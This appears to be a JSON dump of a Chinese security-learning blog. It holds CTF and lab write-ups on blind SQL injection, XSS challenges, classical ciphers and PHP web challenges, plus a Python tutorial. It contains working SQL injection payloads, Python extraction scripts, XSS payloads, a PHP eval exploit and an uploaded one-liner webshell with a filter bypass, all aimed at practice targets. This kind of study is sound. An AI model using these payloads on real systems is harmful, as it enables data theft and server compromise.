这次就先学习到这，下次继续学习。","categories":[{"name":"编程语言学习","slug":"编程语言学习","permalink":"http://bealright.github.io/categories/编程语言学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://bealright.github.io/tags/python/"}]},{"title":"sql注入学习——时间盲注","slug":"sql注入学习——时间盲注","date":"2019-07-25T12:01:24.000Z","updated":"2019-07-28T07:45:15.179Z","comments":true,"path":"2019/07/25/sql注入学习——时间盲注/","link":"","permalink":"http://bealright.github.io/2019/07/25/sql注入学习——时间盲注/","excerpt":"","text":"前言：之前通过前九关学习到了回显注入、报错注入、布尔盲注等一些方法，这次就来详细的学习时间盲注。 在上一篇博客中，了解了布尔盲注，其实布尔盲注和时间盲注大致相同，注入原理是一致的，区别就是一个还是有回显的，一个彻底没有回显，通过构造语句，通过页面响应的时长，来判断信息，这就是时间盲注。 先来学习一下时间盲注所需要的函数123sleep()/延迟函数if(condition,true,false)/若条件为真 返回true，若条件为假 返回falsesubstring(\"string\",strart,length) 主要的也就是这几个了，下面就通过sqli-labs第十关来练习时间盲注 猜测数据库名长度payload：1?id=1\" and if(length(database())&gt;5,1,sleep(10))--+ 这里执行失败的话将睡十秒，能更快的判断，当然也可以将sleep()函数，放在执行成功的位置。 根据浏览器的反应来判断出数据库名长度（如果是手动注入的话切记网速得好，要不然就好玩了。。。）爆出数据库名payload： 1?id=1\" and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+ 根据浏览器的反应，来猜测出数据库名，其实时间注入就是比布尔盲注多了一个if函数，sleep()函数就相当于布尔盲注中的true或false，其他语句大致都相同。 爆表名payload:1?id=1\" and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+ 同样也是观察浏览器反应时间，如果没有睡10秒则表名条件正确，继续尝试 爆列名payload:1?id=1\" and if((ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))))&gt;100,1,sleep(10))--+ 爆值payload：1?id=1\" and if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+ 可以看出其实时间盲注和布尔盲注语句基本相同，只不过是时间盲注通过if语句来执行sleep函数，从而判断。如果理解了布尔盲注，时间盲注也很好理解。 但还是最好写一下脚本，手工注入效率低且容易出错。这次就先学习到这里，了解了时间盲注，等到脚本能力提高了，自己写出一个脚本跑一下。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://bealright.github.io/tags/SQL注入/"}]},{"title":"sql注入学习——布尔盲注","slug":"sql注入学习——布尔盲注","date":"2019-07-24T12:01:24.000Z","updated":"2019-07-27T02:57:35.609Z","comments":true,"path":"2019/07/24/sql注入学习——布尔盲注/","link":"","permalink":"http://bealright.github.io/2019/07/24/sql注入学习——布尔盲注/","excerpt":"","text":"前言：之前通过前九关学习到了回显注入、报错注入等一些方法，这次就来详细的学习布尔盲注。 首先来了解一下盲注的概念 盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。 布尔盲注 原理：注入的时候只会返回True和False，所以布尔盲注就是根据页面显示的是True还是False进行猜测数据库中的信息。 布尔盲注需要几个函数的辅助，就先来了解一下这几个函数1234length()函数可返回字符串的长度substring()函数可以截取字符串，可指定开始的位置和截取的长度ord()函数可以返回单个字符的ASCII码char()函数可将ASCII码转换为对应的字符 具体的用法可以参考大佬的博客Mysql语法介绍，接下来就通过sql-labs练习布尔盲注。 判断注入点（也就是闭合符号）发现输入id=1&#39;会报错1http://127.0.0.1/sqli-labs-master/Less-8/?id=1' 在id=1&#39;后再加上注释符号后又回显正确，所以判定闭合符号为&#39; 爆数据库长度知道闭合符号后，先来爆一下数据库名的长度，这里就用到上面所说的函数了1http://127.0.0.1/sqli-labs-master/Less-8/?id=1' and length(database())&gt;1 --+ 回显正确手工注入的话就要一遍一遍的试试，将后面的长度不断增大，最后得出数据库名的长度为8 爆数据库名知道了数据库名的长度，接下来就来爆破数据库名1Less-8/?id=1' and ord(substr(database(),1,1))&gt;99 --+ 1Less-8/?id=1' and ascii(substr((database()),1,1)) &gt; 99 --+ 1Less-8/?id=1' and ascii(substr((database()),1,1)) = 99 --+ 原理都一样，目的就是取出数据库名中的一个字符通过比较ascii码来猜测出数据库名，但是如果手动爆的话太浪费时间了，可以写脚本，也可以用burp爆破，这里两种方法都试一下 burp爆破先抓包设置变量，这里设置了两个变量所以上面的框中要选第四个选项第一个变量设置为numbers 1到8，第二个变量也设置为numbers 0到127分别设置好，然后开始爆破。不过太慢了，应该是我burp设置的有问题，这里就学习一下这种方法，爆破还是脚本来吧。附上大佬博客利用burp盲注 脚本爆破目前脚本还不会写，就参考大佬的学习一下大佬博客布尔盲注脚本中一些不太懂的语法就参考下面大佬的博客Python requestsPython——入门级(定义功能def函数)格式化输出字符串 1234567891011121314151617181920212223242526272829303132import requestsdef database_len(): for i in range(1,10): url = '''http://127.0.0.1/sqli-labs-master/Less-8/index.php''' payload = '''?id=1' and length(database())&gt;%s''' %i #格式化输出字符串 # print(url+payload+'%23') r = requests.get(url+payload+'%23') if 'You are in' in r.text: print(i) else: #print('false') print('database_length:',i) breakdatabase_len() def database_name(): name = '' for j in range(1,9): for i in 'sqcwertyuioplkjhgfdazxvbnm': url = \"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and substr(database(),%d,1)='%s'\" %(j,i) # print(url+'%23') r = requests.get(url+'%23') if 'You are in' in r.text: name = name+i print(name) break print('database_name:',name)database_name() 爆出了数据库名和长度，接下来改payload爆出表名payload：1?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;90 --+ 修改一下脚本123456789101112131415161718import requestsdef table_name(): name = '' for j in range(1,9): for i in 'sqcwertyuioplkjhgfdazxvbnm': url = \"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1)))=ord('%s')\" %(j,i) # print(url+'%23') r = requests.get(url+'%23') if 'You are in' in r.text: name = name+i print(name) break print('table_name:',name)table_name() 通过修改 limit 0,1 来获取其他表名爆出列名payload：1?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)))&gt;100 --+ 修改脚本，跑出列名123456789101112131415161718import requestsdef column_name(): name = '' for j in range(1,9): for i in 'sqcwertyuioplkjhgfdazxvbnm': url = \"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),%d,1)))=ord('%s')\" %(j,i) # print(url+'%23') r = requests.get(url+'%23') if 'You are in' in r.text: name = name+i print(name) break print('column_name:',name)column_name() 其他的修改limit后的值即可得出其他的列名 爆值1?id=1' and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+ 脚本还和上面的相同，只不过改下payload，但是这个脚本是有缺陷的，就是在遍历，但是我们赋给i的字符只有小写的，有可能其他大写的或特殊符号显示不出来，只要加上就行了。但是这样做的话脚本跑的也会很慢，还是好好学习python，写一个更加便捷的。 最后总结一下布尔盲注常用语句 爆数据库长度1?id=1' and (length(database()))&gt;1 --+ 爆数据库名1?id=1' and (ascii(substr(database(),1,1)))&gt;1 --+ 爆表名1?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;1 --+ 爆列名1?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)))&gt;1 --+ 爆值1?id=1' and (ascii(substr(( select password from users limit 0,1),1,1)))&gt;1--+ 语句几乎不变，根据需要加以改动即可，这次就先学习布尔盲注，接下来学习时间盲注。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://bealright.github.io/tags/SQL注入/"}]},{"title":"python学习（操作列表、if语句）","slug":"python学习（操作列表、if语句）","date":"2019-07-22T11:22:21.000Z","updated":"2019-07-24T00:53:19.740Z","comments":true,"path":"2019/07/22/python学习（操作列表、if语句）/","link":"","permalink":"http://bealright.github.io/2019/07/22/python学习（操作列表、if语句）/","excerpt":"","text":"前言：继续学习python，接下来学习操作列表等知识 第四章、操作列表12345678messages=['a','b','c','d']for message in messages: print(message)#输出结果：abcd 格式：for xxx in xxxx : 利用for循环，遍历整个列表。使用单数和复数式名称，可帮助判断代码段处理的是单个列表元素还是整个列表 也可以在for循环中执行更多的操作，例如：12345678messages=['a','b','c','d']for message in messages: print(message.title() + \"we you he\")#输出结果：Awe you heBwe you heCwe you heDwe you he 在python中，for循环没有花括号，区分是否为for循环的语句就是通过缩进来区分。在for循环下没有缩进的只执行一次。 12345678910111213141516171819messages=['a','b','c','d']for message in messages: print(message.title()+\"we\") print(\"you\"+message.title()+\".\\n\")print(\"he!\") #输出结果：AweyouA.BweyouB.CweyouC.DweyouD.he! 创建数值列表 使用函数range()能够轻松地生成一系列的数字 12345678for value in range(1,5): print(value)#输出结果：1234函数range()从你指定的第一个值开始数，并在到达你指定的第二个值 后停止，因此输出不包含第二个值 使用range()函数和list()函数创建数字列表，将range() 作为list() 的参数，输出将为一个数字列表。 1234numbers=list(range(1,6))print(numbers)#输出结果：[1, 2, 3, 4, 5] 使用 range()函数还可以指定步长 12345#求1-10的偶数numbers=list(range(2,11,2))print(numbers)#输出结果：[2, 4, 6, 8, 10] 实现创建一个列表，其中包含前10个整数（即1~10）的平方 1234567891011121314squares = []for value in range(1,11): square = value**2 squares.append(square) print(squares)输出结果：[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]#为使代码更为简介，还可以不使用临时变量squares = []for value in range(1,11): squares.append(value**2) print(squares) 对数字列表执行简单的统计计算 对数字列表执行简单的统计计算，min(),max(),sum() 12345678numbers = [1,2,3,4,5,6,7,8,9]print(min(numbers))print(max(numbers))print(sum(numbers))#输出结果：1945 列表解析 列表解析 将for 循环和创建新元素的代码合并成一行，并自动 附加新元素。 1234squares = [value**2 for value in range(1,11)]print(squares)#输出结果：[1, 4, 9, 16, 25, 36, 49, 64, 81, 100] 使用列表的一部分切片(可以处理列表的部分元素) 创建切片，可指定要使用的第一个元素和最后一个元素的索引。与函数range() 一样。 1234players = ['a','d','c','d']print(players[0:3])#输出结果：['a', 'd', 'c'] 没有指定第一个索引，将从列表开头开始 123456789101112131415players = ['a','d','c','d']print(players[:4])#输出结果：['a', 'd', 'c', 'd']#要让切片终止于列表末尾，也可使用类似的语法。例如：players = ['a','d','c','d']print(players[2:])#输出结果：['c', 'd']#负数索引返回离列表末尾相应距离的元素players = ['a','d','c','d']print(players[-3:])#输出结果：['d', 'c', 'd'] 遍历切片1234567players = ['a','d','c','d']for player in players[:3]: print(player.title())#输出结果：ADC 复制列表 要复制列表，可创建一个包含整个列表的切片，方法是同时省略起始索引和终止索引（[:] ） 12345678910my = ['a','b','c','d']you = my[:]print(my)print(\"\\n\")print(you)#输出结果：['a', 'b', 'c', 'd']['a', 'b', 'c', 'd'] 元组 定义元组后，可以使用索引来访问其元素，就像访问列表元素一样。而且是用圆括号括起来的 修改元组的操作是被禁止的，不能给元组的元素赋值.例如：12345my=(200,50)my[0]=210print(my[0])#输出结果：TypeError: 'tuple' object does not support item assignment 遍历元组中的所有值 与列表一样，也可以使用for 循环来遍历元组中的所有值 123456mys=(200,50)for my in mys: print(my)#输出结果：20050 修改元组变量 不能修改元组的元素，但可以给存储元组的变量赋值1234567891011121314mys = (200,50)for my in mys: print(my)print(\"\\n\")mys = (210,60)for my in mys: print(my)#输出结果：2005021060 如果需要存储的一组值在程序的整个生命周期内都不变，可使用元组. 第五章、if语句123456789101112mys = ['a','b','c','d']for my in mys: if my == 'a': print(my.title()) else: print(my)#输出结果：Abcd 条件测试 每条if 语句的核心都是一个值为True 或False 的表达式，这种表达式被称为条件测试 条件测试 。 == 相等运算符!=判断两个值是否不等 检查特定值是否包含在列表中 判断特定的值是否已包含在列表中，可使用关键字in 1234&gt;&gt;&gt; mys = ['a','b','c']&gt;&gt;&gt; 'a' in mysTrue 检查特定值是否不包含在列表中 使用关键字not in 1234567mys = ['a','b','d','f']you = 'l'if you not in mys: print(\"no\")#输出结果： no if-elif-else结构12345678910age = 12if age &lt; 4: print(\"a\")elif age &lt; 18: print(\"b\")else: print(\"c\")#输出结果：b 使用多个elif结构12345678910111213age=12if age&lt;4: price = 0elif age &lt;18: price = 5elif age &lt;40: price = 10else: price = 5print(price)#输出结果：5 确定列表不是空的12345678910messages=[]if messages: for message in messages: print(message + \".\") print(\"yes\")else: print(\"no\")#输出结果：no 使用多个列表1234567891011121314people_message = ['a','b','c','d']messages = ['a','b']for message in messages: if message in people_message: print(\"yes\") else: print(\"no\")print(\"over\")#输出结果：yesyesover 这次就先学习到这里，下次继续往后学习。","categories":[{"name":"编程语言学习","slug":"编程语言学习","permalink":"http://bealright.github.io/categories/编程语言学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://bealright.github.io/tags/python/"}]},{"title":"XSS学习-XSS挑战之旅(二)","slug":"XSS学习-XSS挑战之旅(二)","date":"2019-07-19T12:20:32.000Z","updated":"2019-07-24T00:52:00.114Z","comments":true,"path":"2019/07/19/XSS学习-XSS挑战之旅(二)/","link":"","permalink":"http://bealright.github.io/2019/07/19/XSS学习-XSS挑战之旅(二)/","excerpt":"","text":"前言：之前打XSS平台时，打到了第11关就没有继续了，现在有空了就继续打咯，再增加点关于XSS的知识。 第十一关这关坑我好长时间，看了好多博客直接给说修改Referer，给截图中都有自带的Referer值，修改就行，但是我怎么抓都抓不到Referer值。还以为自己设置有问题，去查burp各种的设置。。。 终于看了一篇很细的大佬博客，才算搞懂，Referer值是自己加上的，这里就详细的介绍一下这关，别让和我一样的小白继续跌坑。 我们从第十关来到第十一关（不要直接跳到第十一关，否则看不出任何线索）进入第十一关后看源码发现t_ref字段中，value的值是http referer的值，所以这关应该考的就是http头部的xss注入，那只要在Referer值中注入xss,也会出现在value值中，就会注入成功。 构造Referer（手动构造的，不是一抓包就有的）注入成功forward发包再关闭即可 这里的Referer值是自己构造的，有的大佬一抓包就有，我的怎么抓也没有，这点困扰我很长时间,但其实不论是本地还是在线网站我都抓不到Referer原来的值，这里应该就是抓不到原来的Referer，也可能是我没修改好的问题吧。附上payload:123Referer: \" onmouseover=alert(/xss/) type=\"text\"#onmouseover 事件属性#当鼠标指针移动到图像上时执行一段 JavaScript 第十二关查看源码，发现t_ref字段中，value的值是User-Agent的值，所以和第十一题一样了，我们就抓包修改User-Agent即可。接下来的流程就和第十一关相同了，这里就不阐述了附上payload: 1User-Agent: \" onmouseover=alert(/xss/) type=\"text\" 第十三关查看源代码抓包发现和cookie的值相同那原理和第十关和第十一关就相同了，直接构造playload即可附上payload: 1Cookie: user=\" onmouseover=alert(/xss/) type=\"text\" 第十四关这关需要结合漏洞，直接看先知上的wp了解一下exif xssXSS挑战之旅—游戏通关攻略 第十五关查看源码发现两处不认识的东西，百度查寻同时也发现ng-include是AngularJS的一个指令那注入点应该就在ng-include这里了，先知博客上用的包含第一关的php文件，然后用标签&lt;img&gt;进行xss. 附上payload：1?src='level1.php?name=test&lt;img src=1 onerror=alert(/hacker/)&gt;' 第十六关还按照之前的套路，先试一些常见的payload，看看都过滤了什么输入 1http://test.xss.tv/level16.php?keyword=&lt;script&gt;alert(/xss/)&lt;/script&gt; 发现过滤了script，\\,还有空格这里利用%0d、%0a（回车换行）实现xss攻击绕过,代替空格即可附上payload：12?keyword=&lt;img%0dsrc=1%0donerror=alert(/xss/)&gt;?keyword=&lt;img%0asrc=1%0aonerror=alert(/xss/)&gt; 第十七关先输入最常见的，看下情况 1?arg01=a&amp;arg02=&lt;script&gt;alert(/xss/)&lt;/script&gt; 发现这里是输出点，过滤了&lt;&gt;换onclick事件尝试，发现&quot;被过滤那就用on事件，反正就是各种尝试，结果确实on事件能过payload：123?arg01=a&amp;arg02= onmouseover=alert(/xss/)#onmouseover 事件属性当鼠标指针移动到图像上时执行一段 JavaScript： 第十八关刚进去发现这和第十七关挺像的试试刚才的payload….一模一样payload： 1?arg01=a&amp;arg02= onmouseover=alert(/xss/) 这次就先学习到这，后面的涉及Flash，待有空再研究。另附上大佬博客XSS挑战之旅—游戏通关攻略XSS练习小游戏","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://bealright.github.io/tags/XSS/"}]},{"title":"实验吧— Crypto Write up(一)","slug":"实验吧— Crypto Write up(一)","date":"2019-07-18T11:22:21.000Z","updated":"2019-07-21T14:41:46.484Z","comments":true,"path":"2019/07/18/实验吧— Crypto Write up(一)/","link":"","permalink":"http://bealright.github.io/2019/07/18/实验吧— Crypto Write up(一)/","excerpt":"","text":"前言：最近先做一些关于古典密码的题，了解常见的古典密码。 变异凯撒1加密密文：afZ_r9VYfScOeO_UL^RWUc 刚开始以为这道题考的是凯撒加密，就在线求解，结果不行，那就来分析题目，变异凯撒，应该是利用凯撒加密的原理加以变形，观察一波，提示又提示说格式为flag{}，发现a的ascii到f的ascii偏移量为5，f的ascii到l的ascii偏移量为6,Z的ascii到a的ascii偏移量为7，总结出以后的每个字母偏移量都要加1，观察出规律了，就写脚本跑吧。 附上ASCII表py3脚本123456789101112a = 'afZ_r9VYfScOeO_UL^RWUc'b = ''i = 5for d in a: b+=chr(ord(d)+i) i+=1print(b)#ord()取出一个字符变成ASCII#输出结果：flag&#123;Caesar_variation&#125; 做题小结：凯撒加密是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。有时候需要自己区观察规律，不能死板一味利用在线工具，要多按照题意写出相应的脚本。 围在栅栏中的爱 最近一直在好奇一个问题，QWE到底等不等于ABC？-.- .. –.- .-.. .– - ..-. -.-. –.- –. -. … — —flag格式：CTF{xxx} 首先就摩斯密码解密，解出明文字符为：1KIQLWTFCQGNSOO 再来看提示：QWE到底等不等于ABC？想起来QWE密码，利用QWE密码进行求解，但是求解结果不对，应该是漏掉了一些内容，观察题目发现围在栅栏中的爱，应该还要涉及到栅栏解密，试试看先试试以两字为一栏的，进行QWE解密，解出1rabnayihsevoli 再结合刚才题目中说到爱，观察到解出来的字符后面有love这个词，不过是倒叙的，那就反过来看看。提交即为flag 做题小结：通过这道题了解了QWE加密，键盘按ABC的顺序排列得到对应的字母。附上大佬博客QWE加密 疑惑的汉字 王夫 井工 夫口 由中人 井中 夫夫 由中大 当铺密码在线解密写一个简单脚本跑一下1234567a = [67,84,70,123,82,77,125]b=''for i in a: b=b+chr(i)print(b) 得出flag1CTF&#123;RM&#125; 做题小结：题很简单，主要是为了了解当铺密码，当前汉字有多少笔画出头，就是转化成数字几，按照这个规则即可解出当铺密码。 古典密码 密文内容如下{79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65}请对其进行解密提示：1.加解密方法就在谜面中 2.利用key值的固定结构格式：CTF{ } 先对密文求解，密文为ASCII转成字符123456789a = [79,67,85,123,67,70,84,69,76,88,79,85,89,68,69,67,84,78,71,65,72,79,72,82,78,70,73,69,78,77,125,73,79,84,65]b=''for i in a: b=b+chr(i)print(b)#输出结果：OCU&#123;CFTELXOUYDECTNGAHOHRNFIENM&#125;IOTA 用凯撒和栅栏尝试都不行，去看提示，提示说加解密方法就在谜面中，。。。什么也没看出来，再去看题目，发现是古典密码而古典密码编码方法归根结底主要有两种，即置换和代换。置换密码中包含列置换和周期置换，在百度看到一篇大佬的博客后，感觉这个题应该就是列置换，试试吧。 在此之前，先来了解一下列置换的原理，这里还是参考大佬的博客吧，自己表达不出来这个原理。 置换密码之列置换 首先这个密文一共有35个字符，可以分为7*5和5*7的矩阵就先以7*5来尝试123456 12345671 OCU&#123;CFT2 ELXOUYD3 ECTNGAH 4 OHRNFIE5 NM&#125;IOTA 联系第二个提示，key值的固定结构即为CTF{},这个信息给我们提高很大的便利，这样就可以确定一些列的位置。 开始肯定是C，然后是T，再来就F和{，最后便是} 所以就有两种情况，因为题中第一行有两个C顺序即为这两种 2764xx3或5764xx3 先试第一种，当然第一种也有两种情况，分别为 12764513或2764153 先试第一种1234567CTF&#123;COULDYOUEXCHANGETHEINFORMATION&#125;即为CTF&#123;COULDYOUEXCHANGETHEINFORMATION&#125; 提交，对了。。。运气好，否则得试好几次。 我喜欢培根 – — .-. … . ..–.- .. … ..–.- -.-. — — .-.. ..–.- -… ..- - ..–.- -… .- -.-. — -. ..–.- .. … ..–.- -.-. — — .-.. . .-. ..–.- -.. -.-. -.-. -.. -.-. -.-. -.-. -.. -.. -.. -.-. -.. -.-. -.-. -.-. -.. -.. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.. -.. -.-. -.. -.-. -.-. -.-. -.-. -.. -.-. -.-. -.-. -.-. -.-. / -.-. -.. -.-. -.-. -.-. -.. -.-. -.-. -.. -.-. / -.-. -.-. -.-. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.-. -.. -.. 摩斯密码解密1MORSE_IS_COOL_BUT_BACON_IS_COOLER_DCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCCCDCCCDCCDCCCCDCCDDDCCDDDCCDCDD 摩斯是酷的但培根更酷，利用培根解密这里需要注意一点就是这里按照密文字母顺序替换成AB，因为培根密码中只有A和B.原理详解：1DCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCCCDCCCDCCDCCCCDCCDDDCCDDDCCDCDD 将C替换成A,D替换成B，在线网站解密即可得出flag。 做题小结：重新熟悉一下培根密码。 Fair-Play The quick brown fox jumps over the lazy dog! ihxo{smzdodcikmodcismzd} 刚开始接触这道题根本没有一点思路，无奈只有百度，发现这是古典密码中的Playfair 加密算法，那么就来了解一下。 Playfair算法基于一个5*5的字母矩阵，该矩阵使用一个关键词构造，方法是按从左到右、从上到下顺序，填入关键词的字母(去除重复字母)后，将字母表其作余字母填入。 加密规则 Playfair加密算法是先将明文按两个字母一组进行分组，然后在矩阵中找对应的密文。 以这道题为例，来了解一下加密规则首先编制密码表题中给我们的密匙为The quick brown fox jumps over the lazy dog!密文为ihxo{smzdodcikmodcismzd}先根据密匙来编织出密码表(我这里是按照从左到右)12345t h e q ui c k b ro w n f xm p s v la z y d g 取密文的规则如下： 若明文出现相同字母在一组，则在重复的明文字母中插入一个填充字母(eg:z)进行分隔后重新分组(eg: balloon被重新分组为ba lz lo on) 若分组到最后一组时只有一个字母，则补充字母z 若明文字母在矩阵中同行，则循环取其右边下一个字母为密文(矩阵最右边的下一个是最左边的第一个)(eg: br被加密为ri) 若明文字母在矩阵中同列，则循环取其下边下一个字母为密文(矩阵最下边的下一个是最上边的第一个)(eg: pz被加密为zh) 若明文字母在矩阵中不同行不同列，则取其同行且与同组另一字母同列的字母为密文(eg: mz被加密为pa，fg被加密为xd) 这就是加密方式，如果懂得了加密，那么反过来推出明文即可 做题小结：一开始会很头疼不懂原理，把原理搞懂便很好做的，又了解了一种新的古典密码，继续学习吧！另附上大佬博客python之playfair密码算法详解[原创]向大佬学习。","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://bealright.github.io/categories/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"I春秋——web Write up(一)","slug":"I春秋——web Write up(一)","date":"2019-07-17T11:38:24.000Z","updated":"2019-07-19T16:21:19.506Z","comments":true,"path":"2019/07/17/I春秋——web Write up(一)/","link":"","permalink":"http://bealright.github.io/2019/07/17/I春秋——web Write up(一)/","excerpt":"","text":"前言：总结一下最近做的web题，从题中可以学习到很多知识。 爆破-1 123456789&lt;?phpinclude \"flag.php\";$a = @$_REQUEST['hello'];if(!preg_match('/^\\w*$/',$a ))&#123; die('ERROR');&#125;eval(\"var_dump($$a);\");show_source(__FILE__);?&gt; 给了一段PHP代码，里面还有简单的正则表达式，那就来分析一下。 /表示的是正则表达式的开始和结束，^或\\A 匹配字符串开始位置，\\w匹配任意数字或字母或下划线(a-z,A-Z,0-9,_)，*匹配0次、或1次、或多次其前面的字符(相当于可以输入多个字符、数字、或下划线)，$或者\\Z匹配字符串的结束位置。所以在这里我们输入hello可以执行 提示有说flag在某个变量中，还观察到var_dump($$a)，可以使用超全局变量$GLOBALS，直接在url中构造?hello=GLOBALS即可flag。 做题小结：这道题之所以能够用超全局变量，就是因为输出时又多了一个$,利用它构造一系列超全局变量,得出我们想要的信息。1234$_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息$_REQUEST 用于收集 HTML 表单提交的数据$_POST 广泛用于收集提交 method=\"post\" 的 HTML 表单后的表单数据。$_GET 也可用于收集提交 HTML 表单 (method=\"get\") 之后的表单数据 爆破-2 12345&lt;?phpinclude \"flag.php\";$a = @$_REQUEST['hello'];eval( \"var_dump($a);\");show_source(__FILE__); 提示说flag不在变量中，用$GLOBALS查看果然不在。不在变量中，那就查flag.php文件，查到一个file_get_contents() 函数可以把整个文件读入一个字符串中。1/?hello=file_get_contents('flag.php') 除此之外，我们还可以用另一个函数file()函数。1?hello=file('flag.php') 即可得出flag还可以1?hello=readfile('flag.php') 做题小结:通过上面三种方法，利用三种不同的函数，都可以得出flag，下面就区分一下他们之间的区别。123file() 函数是把整个文件读入一个数组中，然后将文件作为一个数组返回。readfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 '@' 来隐藏错误输出。file_get_contents() 把整个文件读入一个字符串中。 爆破-3给了一串php代码，分析一下 1234567891011121314151617181920212223242526&lt;?php error_reporting(0); //关闭错误报告session_start(); //开启sessionrequire('./flag.php'); //引入flag文件if(!isset($_SESSION['nums']))&#123; $_SESSION['nums'] = 0; $_SESSION['time'] = time();//time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数。 $_SESSION['whoami'] = 'ea';&#125;if($_SESSION['time']+120&lt;time())&#123; session_destroy();//session_destroy() 将重置 session，您将失去所有已存储的 session 数据&#125;$value = $_REQUEST['value'];//$_REQUEST 用于收集 HTML 表单提交的数据$str_rand = range('a', 'z');$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];//mt_rand() 使用 Mersenne Twister 算法返回随机整数if($_SESSION['whoami']==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0)&#123;//a . b 并置 连接两个字符串 \"Hi\" . \"Ha\" HiHa $_SESSION['nums']++;//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。 $_SESSION['whoami'] = $str_rands;//substr(string,start,length) echo $str_rands;&#125;if($_SESSION['nums']&gt;=10)&#123; echo $flag;&#125;show_source(__FILE__);?&gt; 前两个if语句简单，重要的是如下语句123$value = $_REQUEST['value'];$str_rand = range('a', 'z');$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]; $str_rand会从a到z中随机取一个字母。$str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]会拼凑成两个字母赋值给$str_rands。然后就来观察以下代码123456789if($_SESSION['whoami']==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0)&#123;//a . b 并置 连接两个字符串 \"Hi\" . \"Ha\" HiHa $_SESSION['nums']++;//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。 $_SESSION['whoami'] = $str_rands;//substr(string,start,length) echo $str_rands;&#125;if($_SESSION['nums']&gt;=10)&#123; echo $flag;&#125; 很明了了，因为$_SESSION[&#39;nums&#39;] = 0，我们只需将上面的if语句循环十次（即$_SESSION[&#39;nums&#39;]++循环十次），即可得出flag。 接下来就来构造语句，一开始的$_SESSION[&#39;whoami&#39;] = ‘ea’，因此就构造1?value[0]=e&amp;value[1]=a 又因为每执行一次，$_SESSION[&#39;whoami&#39;]会变化而且值与$str_rands相同，并且每执行一次都会输出$str_rands的值，因此只要按照这个顺序输入十次即可得出flag。当然可以也可以写一个脚本来做这道题，但是我们还漏掉了一个很重要的细节就是substr(md5($value),5,4)==0，这个有什么作用那？可以写一个简单的脚本来测试一下看看以数组的形式传入所以刚才只要用数组进行传参就没有问题。 当然我们分析一下就可以知道这个条件在数组的情况下永远为真，因为在数组的情况下是不能MD5加密的，所以肯定==0. 也可以写一个脚本来跑出flag，恰好最近在学python，参考大佬自己也模仿写一下123456789import requestsurl='http://8e7202f5492447d5ab76eb8b7e8b4b27838e55901eba4c5f.changame.ichunqiu.com'# 创建一个session对象 session=requests.Session()# 发送请求html=session.get(url+'?value[]=ea').textfor i in range(10): html=session.get(url+'?value[]='+ html[0:2]).textprint(html) 得到flag 做题小结：web题有很多解法，但最基础的是一定要会写脚本，得加快进度学习python了python中requests.session的妙用python学习之-requests模块基础requests session的作用 Upload看到文件上传，就想起来用一句话木马＋菜刀，那就来先构造一句话木马。上传显示上传成功，我们来查看一下上传之后的php文件把&lt;?php给过滤了，那换一种方法，在大佬的博客上发现绕过&lt;?限制的一句话 1&lt;script language=\"php\"&gt;@eval_r($_POST[pass])&lt;/script&gt; 拿来试试发现php被过滤掉了，那就将php改为大写PHP试试没有显示，说明已经传进去了，菜刀连接通过源代码可以知道上传路径，连接即可得出flag。 做题小结：和XSS一样，一句话木马也有很多绕过姿势，有空一定要总结一下一句话各种绕过姿势，最后附上大佬博客。PHP一句话木马后门一句话木马的套路 